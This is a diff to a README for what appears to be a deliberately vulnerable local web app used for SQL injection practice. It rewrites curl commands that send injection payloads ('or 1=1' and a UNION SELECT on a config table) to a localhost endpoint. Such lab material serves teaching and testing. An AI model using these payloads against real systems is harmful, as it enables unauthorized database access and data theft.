@@ -4,9 +4,9 @@
 
 ### GET request - payload in query param
 ```bash
-curl http://localhost:8080/vun/sql/example1/?name=michal
-curl http://localhost:8080/vun/sql/example1/?name=michal%27%20or%201=1%20--%20-
-curl http://localhost:8080/vun/sql/example1/?name=michal%27%20UNION%20SELECT%20%2A%20FROM%20config%20%2D%2D%20%2D
+curl --get --data-urlencode "name=michal" http://localhost:8080/vun/sql/example1/1/
+curl --get --data-urlencode "name=michal' or 1=1 -- -" http://localhost:8080/vun/sql/example1/1/
+curl --get --data-urlencode "name=michal' UNION SELECT * FROM config -- -" http://localhost:8080/vun/sql/example1/1/
 ```
 
 ### POST request - payload in json body
